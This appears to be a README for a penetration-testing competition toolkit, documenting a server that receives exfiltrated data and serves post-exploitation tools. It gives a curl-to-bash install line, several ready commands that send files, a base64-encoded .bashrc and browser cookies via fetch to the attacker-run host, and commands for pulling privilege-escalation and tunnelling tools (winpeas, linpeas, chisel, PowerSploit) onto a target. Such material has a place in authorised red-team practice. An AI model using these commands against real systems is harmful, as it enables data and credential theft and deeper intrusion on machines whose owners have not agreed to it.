# Install

```
curl -sL https://raw.githubusercontent.com/zoeyg/cptc/main/install.sh | bash -
```

# http server

Run it with the `tools` alias and it'll serve files from `~/tools`, and allow some exfil.

## exfil

### Powershell

```
Invoke-RestMethod -Uri http://host:8080/win-file/output-file-name.ext -Method Post -InFile input-file-name.ext
```

### Base64 File Exfil in url

You can exfil file contents in base64 as part of the url.  Just make a request similar to the following

```
curl "http://host:8080/b64-file/path/output-filename?f=$(base64 --wrap=0 .bashrc)"
```

### Log base64 contents

Example for in browser, this will just log the cookie contents to stdout.

```
fetch('http://host:8080/b64/' + btoa(document.cookie));
```

### curl

```
curl -F 'output-filename=@./path/input-file-name' http://host:8080/upload
```

## Tool retrieval

Some available files:
* chisel.exe
* chisel - linux binary
* winpeas.bat
* winpeas.exe
* win-privesc.zip - all modules from PowerSploit/PrivEsc
* win-recon.zip - all modules from PowerSploit/Recon
* linpeas.sh
* powerview.ps1
* pspy64 - statically linked pspy version
* various statically linked linux binaries in /linux-bin
* various statically linked windows binaries in /win-bin

### Windows

```
Invoke-WebRequest -Uri 'http://host:8080/winpeas.bat' -OutFile .\winpeas.bat
wget http://host:8080/winpeas.bat -outfile winpeas.bat
```

### Linux

```
curl http://host:8080/linpeas.sh -o lp.sh
wget http://host:8080/linpeas.sh
```

## SMB Server

Serve tools from `~/tools` with the `smb` alias